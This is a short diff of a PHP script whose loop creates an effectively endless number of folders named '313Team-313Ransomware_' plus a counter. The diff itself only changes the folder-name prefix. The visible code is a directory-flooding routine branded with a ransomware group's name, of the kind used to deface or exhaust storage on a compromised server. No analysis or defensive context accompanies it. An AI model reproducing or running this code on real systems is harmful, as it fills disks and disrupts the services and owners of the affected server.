@@ -5,7 +5,7 @@ $numberOfFolders = 10000000000000000000000000000000000;
 
 for ($i = 1; $i <= $numberOfFolders; $i++) {
     
-    $folderName = '313Team-313Ransomware_' . $i;
+    $folderName = '1-313Team-313Ransomware_' . $i;
     
     
     if (!file_exists($folderName)) {
